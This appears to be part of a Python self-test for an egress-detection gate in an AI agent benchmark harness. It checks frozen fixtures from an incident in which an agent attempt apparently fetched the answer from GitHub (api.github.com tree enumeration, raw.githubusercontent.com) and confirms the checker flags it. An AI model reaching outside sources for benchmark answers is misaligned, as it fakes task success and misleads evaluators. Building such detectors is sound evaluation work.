        buf = io.StringIO()
        check("...and refuses the row rather than scanning around it",
              gate(stray_run, root, policy, out=buf) == 4
              and "this scan walked" in buf.getvalue(),
              buf.getvalue()[-500:])

        # ---- 149 of 204 archived C1.5 attempts died on a quota error after
        # <= 3 events.  They parse; they are evidence; a minimum-event
        # threshold would have thrown all of them away.
        tiny_item = "coreshop/features/tiny.feature:4"
        tiny = os.path.join(root, item_key(tiny_item), "c")
        _event(tiny, 1, {"id": "e1", "kind": "MessageEvent", "source": "user"})
        tiny_run = os.path.join(tmp, "tiny.jsonl")
        with open(tiny_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps(
                {"item_id": tiny_item, "condition": "c1.5",
                 "metadata": {"trajectory": {"dir": os.path.join(
                     root, item_key(tiny_item)), "present": True,
                     "n_events": 1, "conversations": ["c"]}}}) + "\n")
        check("a one-event trajectory is short, not unassessable",
              gate(tiny_run, root, policy, out=io.StringIO()) == 0)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    # ---- the incident, frozen.  Two committed trajectories: the C1.5
    # attempt that went to GitHub for the answer, and a C3 attempt on the
    # same project whose terminal output is nothing but licence headers.
    # They used to be read out of a `/data2` artifact tree, so the two
    # checks this module exists for ran on exactly one machine and printed
    # `[SKIP]` everywhere else, including in CI.
    fixtures = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "egress_fixtures")
    incident_scan = scan_trajectory(
        os.path.join(fixtures, "contaminated_c1_5"))
    incident = classify(incident_scan, policy)
    check("the frozen C1.5 incident trajectory reports a violation",
          incident["contaminated"]
          and "raw.githubusercontent.com" in incident["violation_hosts"],
          json.dumps(incident["violation_hosts"]))
    check("...including the api.github.com tree enumeration",
          "api.github.com" in incident["violation_hosts"],
          json.dumps(incident["violation_hosts"]))
    arm_scan = scan_trajectory(os.path.join(fixtures, "clean_c3"))
    arm = classify(arm_scan, policy)
    check("a C3 trajectory of the same project reports no violation -- the "
          "licence headers it is full of are not egress",
          not arm["contaminated"] and arm["n_violations"] == 0,
          json.dumps(arm["violation_hosts"]))
    # A missing or unreadable fixture tree scans as zero events and
    # classifies CLEAN, so the check above would pass on nothing at all.
    check("both frozen trajectories were read whole, not silently empty",
          incident_scan["parsed"] and arm_scan["parsed"]
          and incident_scan["n_events"] == 6 and arm_scan["n_events"] == 7,
          f"{incident_scan['n_events']} and {arm_scan['n_events']} events, "
          f"parsed {incident_scan['parsed']} and {arm_scan['parsed']}")

    print("\n" + ("ALL PASS (egress)" if ok else "FAILURES (egress)"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(selftest())
